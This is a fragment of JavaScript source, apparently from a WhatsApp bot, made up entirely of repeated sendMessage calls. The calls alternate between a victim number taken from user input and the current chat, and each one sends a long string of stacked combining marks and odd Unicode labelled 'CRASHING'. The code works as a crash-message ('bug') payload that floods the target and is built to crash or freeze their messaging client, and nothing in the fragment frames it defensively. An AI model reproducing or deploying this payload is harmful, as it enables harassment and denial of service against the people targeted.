                    await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
